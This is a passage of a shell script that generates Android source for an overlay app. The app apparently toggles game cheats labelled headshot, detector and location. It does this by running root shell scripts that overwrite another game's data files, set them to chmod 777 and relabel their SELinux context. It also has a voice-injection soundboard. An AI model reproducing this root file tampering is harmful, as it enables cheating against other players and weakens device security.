        val sw7 = v.findViewById<MaterialSwitch>(R.id.switchFloater7)

        sw1.isChecked = prefs.getBoolean("f1_on", false); sw2.isChecked = prefs.getBoolean("f2_on", false)
        sw3.isChecked = prefs.getBoolean("f3_on", false); sw4.isChecked = prefs.getBoolean("f4_on", false)
        sw5.isChecked = prefs.getBoolean("f5_on", false); sw6.isChecked = prefs.getBoolean("f6_on", false)
        sw7.isChecked = prefs.getBoolean("f7_on", false)
        
        sw1.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f1_on", isChecked).apply(); applyFloater(1, isChecked) }
        sw2.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f2_on", isChecked).apply(); applyFloater(2, isChecked) }
        sw3.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f3_on", isChecked).apply(); applyFloater(3, isChecked) }
        sw4.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f4_on", isChecked).apply(); applyFloater(4, isChecked) }
        sw5.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f5_on", isChecked).apply(); applyFloater(5, isChecked) }
        sw6.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f6_on", isChecked).apply(); applyFloater(6, isChecked) }
        sw7.setOnCheckedChangeListener { _, isChecked -> prefs.edit().putBoolean("f7_on", isChecked).apply(); applyFloater(7, isChecked) }
        
        panel = v; wm.addView(v, params)
    }
    private fun minimize() {
        panel?.let { runCatching { wm.removeView(it) } }; panel = null
        val b = LayoutInflater.from(this).inflate(R.layout.overlay_bubble, null); val params = overlayParams(120, 120)
        var isDragging = false; var initialX = 0; var initialY = 0; var initialTouchX = 0f; var initialTouchY = 0f
        b.setOnTouchListener { view, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> { initialX = params.x; initialY = params.y; initialTouchX = event.rawX; initialTouchY = event.rawY; isDragging = false; true }
                MotionEvent.ACTION_MOVE -> { val dx = event.rawX - initialTouchX; val dy = event.rawY - initialTouchY; if (Math.abs(dx) > 10 || Math.abs(dy) > 10) isDragging = true; if (isDragging) { params.x = initialX + dx.toInt(); params.y = initialY + dy.toInt(); wm.updateViewLayout(b, params) }; true }
                MotionEvent.ACTION_UP -> { if (!isDragging) { runCatching { wm.removeView(b) }; bubble = null; showPanel() }; true }
                else -> false
            }
        }
        bubble = b; wm.addView(b, params)
    }
    private fun setupDrag(handle: View, rootView: View, params: WindowManager.LayoutParams) {
        handle.setOnTouchListener(object : View.OnTouchListener {
            var initialX = 0; var initialY = 0; var initialTouchX = 0f; var initialTouchY = 0f
            override fun onTouch(view: View, event: MotionEvent): Boolean {
                when (event.action) {
                    MotionEvent.ACTION_DOWN -> { initialX = params.x; initialY = params.y; initialTouchX = event.rawX; initialTouchY = event.rawY; return true }
                    MotionEvent.ACTION_MOVE -> { params.x = initialX + (event.rawX - initialTouchX).toInt(); params.y = initialY + (event.rawY - initialTouchY).toInt(); wm.updateViewLayout(rootView, params); return true }
                }
                return false
            }
        })
    }
    private fun close() { panel?.let { runCatching { wm.removeView(it) } }; panel = null; bubble?.let { runCatching { wm.removeView(it) } }; bubble = null; stopSelf() }
    
    private fun applyFloater(number: Int, on: Boolean) {
        if (number == 3) { 
            val error = copyAssetToTarget(if (on) floater3OnAsset else floater3OffAsset, "fileinfo", glooTargetDir)
            if (error == null) Toast.makeText(this, if (on) "✅ GLOO CROSS Activated" else "✅ GLOO CROSS Deactivated", Toast.LENGTH_SHORT).show() 
            else Toast.makeText(this, "❌ Paste Failed!\n$error", Toast.LENGTH_LONG).show()
            return
        }
        if (number == 4 || number == 5 || number == 6) { 
            val asset = when(number) { 4 -> floater4OnAsset; 5 -> floater5OnAsset; else -> floater6OnAsset }
            val tag = when(number) { 4 -> "CHEST HS"; 5 -> "BODY HS"; else -> "MAGIC" }
            val error = copyWithBackup(asset, cacheResName, compulsoryDir, on, "cache_res.bak")
            if (error == null) Toast.makeText(this, if (on) "✅ $tag Activated" else "✅ $tag Deactivated", Toast.LENGTH_SHORT).show() 
            else Toast.makeText(this, "❌ Paste Failed!\n$error", Toast.LENGTH_LONG).show()
            return
        }
        if (number == 7) { 
            val error = copyWithBackup(floater7OnAsset, pdcacheName, filesDir, on, "pdcache.bak")
            if (error == null) Toast.makeText(this, if (on) "✅ LOCATION Activated" else "✅ LOCATION Deactivated", Toast.LENGTH_SHORT).show() 
            else Toast.makeText(this, "❌ Paste Failed!\n$error", Toast.LENGTH_LONG).show()
            return
        }
        val asset = when { number == 1 && on -> floater1OnAsset; number == 1 && !on -> floater1OffAsset; number == 2 && on -> floater2OnAsset; else -> floater2OffAsset }
        val error = copyAssetToTarget(asset, assetIndexerName, avatarDir); val tag = if (number == 1) "GUCCI DETECTOR" else "GUCCI HS"
        if (error == null) Toast.makeText(this, if (on) "✅ $tag Activated" else "✅ $tag Deactivated", Toast.LENGTH_SHORT).show() 
        else Toast.makeText(this, "❌ Paste Failed!\n$error", Toast.LENGTH_LONG).show()
    }
    private fun copyWithBackup(assetName: String, targetName: String, targetDir: String, enable: Boolean, bakName: String): String? {
        try {
            val scriptFile = File(cacheDir, "backup_script.sh")
            if (enable) {
                val tmp = File(cacheDir, assetName)
                assets.open(assetName).use { input -> tmp.outputStream().use { input.copyTo(it) } }
                scriptFile.writeText("""
                    #!/system/bin/sh
                    TARGET_DIR="$targetDir"
                    TARGET_FILE="${'$'}TARGET_DIR/$targetName"
                    BAK_FILE="${'$'}TARGET_DIR/$bakName"
                    MOD_FILE="${tmp.absolutePath}"
                    mkdir -p "${'$'}TARGET_DIR"
                    if [ -f "${'$'}TARGET_FILE" ] && [ ! -f "${'$'}BAK_FILE" ]; then mv "${'$'}TARGET_FILE" "${'$'}BAK_FILE"; fi
                    cp -f "${'$'}MOD_FILE" "${'$'}TARGET_FILE"
                    chmod 777 "${'$'}TARGET_FILE"
                    chcon --reference="${'$'}TARGET_DIR" "${'$'}TARGET_FILE" 2>/dev/null
                    echo "SUCCESS_ON"
                """.trimIndent())
            } else {
                scriptFile.writeText("""
                    #!/system/bin/sh
                    TARGET_DIR="$targetDir"
                    TARGET_FILE="${'$'}TARGET_DIR/$targetName"
                    BAK_FILE="${'$'}TARGET_DIR/$bakName"
                    if [ -f "${'$'}TARGET_FILE" ]; then rm -f "${'$'}TARGET_FILE"; fi
                    if [ -f "${'$'}BAK_FILE" ]; then mv "${'$'}BAK_FILE" "${'$'}TARGET_FILE"; fi
                    echo "SUCCESS_OFF"
                """.trimIndent())
            }
            val chmodP = ProcessBuilder("su", "-c", "chmod 777 " + scriptFile.absolutePath).start(); chmodP.waitFor()
            val p = ProcessBuilder("su", "-mm", "-c", "sh " + scriptFile.absolutePath).redirectErrorStream(true).start()
            val output = p.inputStream.bufferedReader().readText(); val code = p.waitFor()
            scriptFile.delete()
            return if (output.contains("SUCCESS_") && code == 0) null else { "Check Root. Output: $output" }
        } catch (e: Exception) { return e.message }
    }
    private fun copyAssetToTarget(name: String, targetFileName: String, targetDir: String): String? {
        try {
            val tmp = File(cacheDir, name); assets.open(name).use { input -> tmp.outputStream().use { input.copyTo(it) } }
            val scriptFile = File(cacheDir, "paste.sh")
            scriptFile.writeText("""
                #!/system/bin/sh
                TARGET_DIR="$targetDir"
                mkdir -p "${'$'}TARGET_DIR"
                FULL_PATH="${'$'}TARGET_DIR/$targetFileName"
                cp -f "${tmp.absolutePath}" "${'$'}FULL_PATH"
                chmod 777 "${'$'}FULL_PATH"
                chcon --reference="${'$'}TARGET_DIR" "${'$'}FULL_PATH" 2>/dev/null
                echo "PASTE_SUCCESSFUL"
            """.trimIndent())
            val chmodP = ProcessBuilder("su", "-c", "chmod 777 " + scriptFile.absolutePath).start(); chmodP.waitFor()
            val p = ProcessBuilder("su", "-mm", "-c", "sh " + scriptFile.absolutePath).redirectErrorStream(true).start()
            val output = p.inputStream.bufferedReader().readText(); val code = p.waitFor()
            tmp.delete(); scriptFile.delete()
            return if (output.contains("PASTE_SUCCESSFUL") && code == 0) null else { "Check Root. Output: $output" }
        } catch (e: Exception) { return e.message }
    }
    override fun onDestroy() { panel?.let { runCatching { wm.removeView(it) } }; bubble?.let { runCatching { wm.removeView(it) } }; super.onDestroy() }
}
EOF
cat > app/src/main/java/com/example/shtile/VoicePersona.kt << 'EOF'
package com.example.shtile

data class VoicePersona(
    val id: String,   
    val name: String  
)
EOF
cat > app/src/main/res/layout/activity_gucci_voice.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:background="#07090C" android:fillViewport="true">
<LinearLayout android:orientation="vertical" android:padding="16dp" android:layout_width="match_parent" android:layout_height="wrap_content">
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="16dp">
        <ImageView android:layout_width="50dp" android:layout_height="50dp" android:src="@drawable/ic_app_icon" android:layout_marginEnd="12dp"/>
        <LinearLayout android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:orientation="vertical">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="GUCCI VOICES" android:textColor="#4FC3F7" android:textSize="22sp" android:textStyle="bold" android:fontFamily="sans-serif-black" android:fontStyle="italic"/>
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="👑 Gaming Voice Soundboard" android:textColor="#8B949E" android:textSize="12sp"/>
        </LinearLayout>
    </LinearLayout>
    <com.google.android.material.button.MaterialButton android:id="@+id/btnTurnOverlayOn" android:layout_width="match_parent" android:layout_height="55dp" android:text="🎮 Turn overlay on" android:textColor="#000000" app:backgroundTint="#00E5A0" app:cornerRadius="12dp" android:textStyle="bold" android:layout_marginBottom="12dp"/>
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="16dp">
        <com.google.android.material.button.MaterialButton android:id="@+id/btnMaxVolume" android:layout_width="0dp" android:layout_weight="1" android:layout_height="50dp" android:text="🔊 Max volume" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="12dp" android:layout_marginEnd="8dp"/>
        <com.google.android.material.button.MaterialButton android:id="@+id/btnStopAll" android:layout_width="0dp" android:layout_weight="1" android:layout_height="50dp" android:text="⏹️ Stop all" android:textColor="#FFFFFF" app:backgroundTint="#EF4444" app:cornerRadius="12dp"/>
    </LinearLayout>
    <com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="#0A1120" app:cardCornerRadius="16dp" app:strokeColor="#1F4E79" app:strokeWidth="1dp" android:layout_marginBottom="16dp">
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="16dp">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="🗣️ Text → Voice" android:textColor="#FFFFFF" android:textStyle="bold" android:layout_marginBottom="12dp"/>
            
            <!-- NEW SPINNER ADDED HERE -->
            <Spinner android:id="@+id/spinnerVoiceSelect" android:layout_width="match_parent" android:layout_height="40dp" android:layout_marginBottom="8dp" android:backgroundTint="#00E5A0"/>
            
            <EditText android:id="@+id/etVoiceText" android:layout_width="match_parent" android:layout_height="80dp" android:gravity="top|start" android:hint="Type here..." android:textColor="#FFFFFF" android:textColorHint="#8B949E" android:background="#12161F" android:padding="10dp" android:layout_marginBottom="12dp"/>
            <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
                <com.google.android.material.button.MaterialButton android:id="@+id/btnPlayText" android:layout_width="0dp" android:layout_weight="1" android:layout_height="45dp" android:text="▶️ Play" android:textColor="#000000" app:backgroundTint="#00E5A0" app:cornerRadius="8dp" android:textStyle="bold" android:layout_marginEnd="8dp"/>
                <com.google.android.material.button.MaterialButton android:id="@+id/btnSaveText" android:layout_width="0dp" android:layout_weight="1" android:layout_height="45dp" android:text="💾 Save to Cards" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="8dp" android:textStyle="bold"/>
            </LinearLayout>
        </LinearLayout>
    </com.google.android.material.card.MaterialCardView>
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="12dp">
        <TextView android:id="@+id/tvVoiceCount" android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="🎧 My voices (0)" android:textColor="#FFFFFF" android:textSize="18sp" android:textStyle="bold"/>
        <com.google.android.material.button.MaterialButton android:id="@+id/btnAddVoice" android:layout_width="wrap_content" android:layout_height="40dp" android:text="+ Add voice" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="8dp" android:textSize="12sp"/>
        <com.google.android.material.button.MaterialButton android:id="@+id/btnExtractVideo" android:layout_width="wrap_content" android:layout_height="40dp" android:text="🎬 Video" android:textColor="#FFFFFF" app:backgroundTint="#3B82F6" app:cornerRadius="8dp" android:textSize="12sp" android:layout_marginStart="4dp"/>
    </LinearLayout>
    <GridView android:id="@+id/gridVoices" android:layout_width="match_parent" android:layout_height="wrap_content" android:numColumns="2" android:verticalSpacing="12dp" android:horizontalSpacing="12dp"/>
</LinearLayout>
</ScrollView>
EOF
cat > app/src/main/res/layout/overlay_gucci_voice.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="240dp" android:layout_height="wrap_content" app:cardBackgroundColor="#0A1120" app:cardCornerRadius="12dp" app:cardElevation="10dp" app:strokeColor="#1F4E79" app:strokeWidth="1dp">
<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="8dp">
    <LinearLayout android:id="@+id/dragHandleTop" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:layout_marginBottom="6dp">
        <TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="👑 GUCCI VOICES" android:textColor="#4FC3F7" android:textStyle="bold" android:textSize="11sp" android:fontFamily="sans-serif-black"/>
        <ImageButton android:id="@+id/btnMinimize" android:layout_width="20dp" android:layout_height="20dp" android:padding="2dp" android:background="@drawable/bg_circle_grey" android:src="@drawable/ic_minimize" app:tint="#8B949E" android:layout_marginEnd="4dp"/>
        <ImageButton android:id="@+id/btnClose" android:layout_width="20dp" android:layout_height="20dp" android:padding="2dp" android:background="@drawable/bg_circle_grey" android:src="@drawable/ic_close" app:tint="#FF4D4D"/>
    </LinearLayout>
    
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:background="#12161F" android:padding="4dp" android:layout_marginBottom="6dp">
        <TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="INJECT GUCCI VOICES" android:textColor="#00E5A0" android:textSize="9sp" android:textStyle="bold"/>
        <com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/swInject" android:layout_width="wrap_content" android:layout_height="wrap_content" android:checked="false"/>
    </LinearLayout>
    
    <TextView android:id="@+id/tvCopyMixer" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="⚠️ Routing failed. Tap here to copy Mixer Log." android:textColor="#FF4D4D" android:textSize="9sp" android:textStyle="bold" android:gravity="center" android:padding="4dp" android:visibility="gone"/>
    
    <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:layout_marginBottom="6dp">
        <LinearLayout android:id="@+id/tabCards" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:gravity="center" android:background="@drawable/bg_box_dark" android:layout_marginEnd="2dp">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="🎵" android:textColor="#FFFFFF" android:textSize="10sp" android:textStyle="bold"/>
        </LinearLayout>
        <LinearLayout android:id="@+id/tabType" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:gravity="center" android:background="@drawable/bg_box_dark" android:layout_marginEnd="2dp">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="💬" android:textColor="#FFFFFF" android:textSize="10sp" android:textStyle="bold"/>
        </LinearLayout>
        <LinearLayout android:id="@+id/tabLive" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:gravity="center" android:background="#12161F">
            <TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="🔴" android:textColor="#FFFFFF" android:textSize="10sp" android:textStyle="bold"/>
        </LinearLayout>
    </LinearLayout>
    
    <LinearLayout android:id="@+id/pageCards" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:visibility="visible">
        <GridView android:id="@+id/lvVoicesFloater" android:layout_width="match_parent" android:layout_height="130dp" android:numColumns="3" android:verticalSpacing="2dp" android:horizontalSpacing="2dp"/>
        <ProgressBar android:id="@+id/pbPlayback" style="?android:attr/progressBarStyleHorizontal" android:layout_width="match_parent" android:layout_height="3dp" android:layout_marginTop="2dp" android:layout_marginBottom="2dp" android:progressTint="#00E5A0" android:visibility="invisible"/>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlayRefresh" android:layout_width="0dp" android:layout_weight="1" android:layout_height="26dp" android:text="REFRESH" android:textColor="#000000" app:backgroundTint="#3B82F6" app:cornerRadius="4dp" android:textSize="8sp" android:layout_marginEnd="2dp" android:insetTop="0dp" android:insetBottom="0dp"/>
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlayStop" android:layout_width="0dp" android:layout_weight="1" android:layout_height="26dp" android:text="STOP" android:textColor="#FFFFFF" app:backgroundTint="#FF4D4D" app:cornerRadius="4dp" android:textSize="8sp" android:insetTop="0dp" android:insetBottom="0dp"/>
        </LinearLayout>
    </LinearLayout>
    
    <LinearLayout android:id="@+id/pageType" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:visibility="gone">
        <Spinner android:id="@+id/spinnerVoiceSelectFloater" android:layout_width="match_parent" android:layout_height="28dp" android:layout_marginBottom="4dp" android:backgroundTint="#00E5A0"/>
        <EditText android:id="@+id/etTypeHere" android:layout_width="match_parent" android:layout_height="32dp" android:hint="Type here..." android:textColor="#FFFFFF" android:textColorHint="#8B949E" android:background="#12161F" android:padding="4dp" android:textSize="10sp" android:layout_marginBottom="4dp"/>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlaySend" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:text="Play" android:textColor="#000000" app:backgroundTint="#00E5A0" app:cornerRadius="4dp" android:textSize="9sp" android:layout_marginEnd="2dp" android:insetTop="0dp" android:insetBottom="0dp"/>
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlaySave" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:text="Save" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="4dp" android:textSize="9sp" android:insetTop="0dp" android:insetBottom="0dp"/>
        </LinearLayout>
    </LinearLayout>
    
    <LinearLayout android:id="@+id/pageLive" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:visibility="gone">
        <TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="⚠️ Headphones recommended." android:textColor="#FF4D4D" android:textSize="8sp" android:textStyle="bold" android:layout_marginBottom="2dp" android:gravity="center"/>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:background="#12161F" android:padding="4dp" android:layout_marginBottom="4dp">
            <TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="🎤 Live Mode" android:textColor="#FFFFFF" android:textSize="9sp" android:textStyle="bold"/>
            <com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/swLiveMic" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
        </LinearLayout>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:background="#12161F" android:padding="4dp" android:layout_marginBottom="4dp">
            <TextView android:id="@+id/tvPitch" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Pitch: 0" android:textColor="#8B949E" android:textSize="8sp"/>
            <SeekBar android:id="@+id/sbPitch" android:layout_width="match_parent" android:layout_height="wrap_content" android:max="24" android:progress="12"/>
            <TextView android:id="@+id/tvEcho" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Echo: 0ms" android:textColor="#8B949E" android:textSize="8sp"/>
            <SeekBar android:id="@+id/sbEcho" android:layout_width="match_parent" android:layout_height="wrap_content" android:max="50" android:progress="0"/>
        </LinearLayout>
    </LinearLayout>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
EOF
cat > app/src/main/java/com/example/shtile/GucciVoiceActivity.kt << 'EOF'
package com.example.shtile

import android.app.Activity
import android.content.Intent
import android.media.MediaPlayer
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class GucciVoiceActivity : AppCompatActivity(), TextToSpeech.OnInitListener {
    private lateinit var tts: TextToSpeech
    private var isTtsReady = false
    private var mediaPlayer: MediaPlayer? = null
    private lateinit var gridView: GridView
    private lateinit var voiceAdapter: VoiceGridAdapter
    private var voiceList = listOf<File>()
    private var currentPlayingFile: File? = null

    private val PICK_AUDIO_REQ = 100

    // 🔴 PASTE YOUR ELEVENLABS API KEY HERE
    private val ELEVENLABS_API_KEY = "sk_YOUR_NEW_API_KEY_HERE"

    // 🔴 ADD YOUR VOICE IDs HERE
    private val personas = listOf(
        VoicePersona("21m00Tcm4TlvDq8ikWAM", "Rachel (Default)"),
        VoicePersona("pNInz6obpgDQGcFmaJgB", "Adam (Default)"),
        VoicePersona("YOUR_ZARA_ID_HERE", "Zara Gaming")
    )
    private var selectedPersona = personas[0]

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_gucci_voice)
        
        tts = TextToSpeech(this, this)

        val etVoiceText = findViewById<EditText>(R.id.etVoiceText)
        val spinner = findViewById<Spinner>(R.id.spinnerVoiceSelect)
        gridView = findViewById(R.id.gridVoices)
        
        spinner.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, personas.map { it.name })
        spinner.onItemSelectedListener = object : AdapterView.OnItemSelectedListener {
            override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, id: Long) {
                selectedPersona = personas[position]
            }
            override fun onNothingSelected(parent: AdapterView<*>?) {}
        }

        loadVoices()

        findViewById<MaterialButton>(R.id.btnPlayText).setOnClickListener {
            val text = etVoiceText.text.toString().trim()
            if (text.isNotEmpty()) { generateAndPlayElevenLabs(text, selectedPersona) } 
            else { Toast.makeText(this, "Type something first!", Toast.LENGTH_SHORT).show() }
        }

        findViewById<MaterialButton>(R.id.btnSaveText).setOnClickListener {
            val text = etVoiceText.text.toString().trim()
            if (text.isNotEmpty()) { 
                generateAndSaveElevenLabs(text, selectedPersona)
                etVoiceText.text.clear()
            } else { Toast.makeText(this, "Type something first!", Toast.LENGTH_SHORT).show() }
        }

        // 🚀 BULK ADD VOICE BUTTON
        findViewById<MaterialButton>(R.id.btnAddVoice).setOnClickListener {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply { 
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "audio/*" 
                putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true) // Allows selecting multiple files
            }
            startActivityForResult(intent, PICK_AUDIO_REQ)
        }

        findViewById<MaterialButton>(R.id.btnExtractVideo).setOnClickListener {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply { 
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "video/*" 
                putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
            }
            startActivityForResult(intent, PICK_AUDIO_REQ)
        }

        findViewById<MaterialButton>(R.id.btnTurnOverlayOn).setOnClickListener {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                startActivity(intent)
                Toast.makeText(this, "Please grant 'Display over other apps'", Toast.LENGTH_LONG).show()
            } else {
                startActivity(Intent(this, TransparentVoiceActivity::class.java))
                Toast.makeText(this, "Floater Launched!", Toast.LENGTH_SHORT).show()
            }
        }

        findViewById<MaterialButton>(R.id.btnStopAll).setOnClickListener { stopPlayback() }
    }

    private fun callElevenLabsApi(text: String, voiceId: String, onSuccess: (ByteArray) -> Unit, onError: (String) -> Unit) {
        Thread {
            try {
                val url = URL("https://api.elevenlabs.io/v1/text-to-speech/$voiceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Accept", "audio/mpeg")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("xi-api-key", ELEVENLABS_API_KEY)
                conn.doOutput = true
                
                val jsonBody = """{"text": "$text", "model_id": "eleven_multilingual_v2", "voice_settings": {"stability": 0.5, "similarity_boost": 0.75}}"""
                conn.outputStream.write(jsonBody.toByteArray())
                
                if (conn.responseCode == 200) {
                    val audioBytes = conn.inputStream.readBytes()
                    Handler(Looper.getMainLooper()).post { onSuccess(audioBytes) }
                } else {
                    val err = conn.errorStream.bufferedReader().readText()
                    Handler(Looper.getMainLooper()).post { onError("API Error: ${conn.responseCode} - $err") }
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post { onError(e.message ?: "Unknown Error") }
            }
        }.start()
    }

    private fun generateAndPlayElevenLabs(text: String, persona: VoicePersona) {
        Toast.makeText(this, "Generating ${persona.name}...", Toast.LENGTH_SHORT).show()
        callElevenLabsApi(text, persona.id, { bytes ->
            Thread {
                try {
                    val tempFile = File(cacheDir, "temp_play.mp3")
                    tempFile.writeBytes(bytes)
                    Handler(Looper.getMainLooper()).post {
                        stopPlayback()
                        mediaPlayer = MediaPlayer().apply {
                            setDataSource(tempFile.absolutePath)
                            prepare()
                            start()
                        }
                    }
                } catch (e: Exception) { 
                    Handler(Looper.getMainLooper()).post { Toast.makeText(this, "Playback Error", Toast.LENGTH_SHORT).show() }
                }
            }.start()
        }, { error -> Toast.makeText(this, error, Toast.LENGTH_LONG).show() })
    }

    private fun generateAndSaveElevenLabs(text: String, persona: VoicePersona) {
        Toast.makeText(this, "Saving ${persona.name}...", Toast.LENGTH_SHORT).show()
        callElevenLabsApi(text, persona.id, { bytes ->
            Thread {
                try {
                    val file = File(VoiceDataHelper.getVoicesDir(this), "${persona.name.replace(" ", "_")}_${System.currentTimeMillis()}.mp3")
                    file.writeBytes(bytes)
                    runOnUiThread {
                        loadVoices()
                        Toast.makeText(this, "Saved to Cards!", Toast.LENGTH_SHORT).show()
                    }
                } catch (e: Exception) { 
                    runOnUiThread { Toast.makeText(this, "Save Error", Toast.LENGTH_SHORT).show() }
                }
            }.start()
        }, { error -> Toast.makeText(this, error, Toast.LENGTH_LONG).show() })
    }

    private fun loadVoices() {
        voiceList = VoiceDataHelper.getAllVoices(this)
        voiceAdapter = VoiceGridAdapter(voiceList)
        gridView.adapter = voiceAdapter
        findViewById<TextView>(R.id.tvVoiceCount).text = "🎧 My voices (${voiceList.size})"
    }

    private fun playVoice(file: File) {
        stopPlayback()
        currentPlayingFile = file
        try {
            mediaPlayer = MediaPlayer().apply {
                setDataSource(file.absolutePath)
                prepare()
                start()
                setOnCompletionListener { currentPlayingFile = null; voiceAdapter.notifyDataSetChanged() }
            }
            voiceAdapter.notifyDataSetChanged()
        } catch (e: Exception) { Toast.makeText(this, "Cannot play this file", Toast.LENGTH_SHORT).show() }
    }

    private fun stopPlayback() {
        mediaPlayer?.let { if (it.isPlaying) it.stop(); it.release() }
        mediaPlayer = null
        currentPlayingFile = null
        if (::voiceAdapter.isInitialized) voiceAdapter.notifyDataSetChanged()
    }

    // 🚀 BULK IMPORT LOGIC HERE
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PICK_AUDIO_REQ && resultCode == RESULT_OK) {
            val clipData = data?.clipData
            if (clipData != null) {
                // User selected multiple files
                Toast.makeText(this, "Saving ${clipData.itemCount} files...", Toast.LENGTH_SHORT).show()
                Thread {
                    var savedCount = 0
                    for (i in 0 until clipData.itemCount) {
                        val uri = clipData.getItemAt(i).uri
                        val newFile = VoiceDataHelper.saveFromUri(this, uri)
                        if (newFile != null) savedCount++
                    }
                    runOnUiThread {
                        loadVoices()
                        Toast.makeText(this, "✅ $savedCount voices added!", Toast.LENGTH_LONG).show()
                    }
                }.start()
            } else if (data?.data != null) {
                // User selected one file
                val uri = data.data!!
                Toast.makeText(this, "Saving file...", Toast.LENGTH_SHORT).show()
                Thread {
                    val newFile = VoiceDataHelper.saveFromUri(this, uri)
                    runOnUiThread {
                        if (newFile != null) { loadVoices(); Toast.makeText(this, "Voice Added!", Toast.LENGTH_SHORT).show() }
                        else { Toast.makeText(this, "Failed to add voice", Toast.LENGTH_SHORT).show() }
                    }
                }.start()
            }
        }
    }

    override fun onInit(status: Int) {
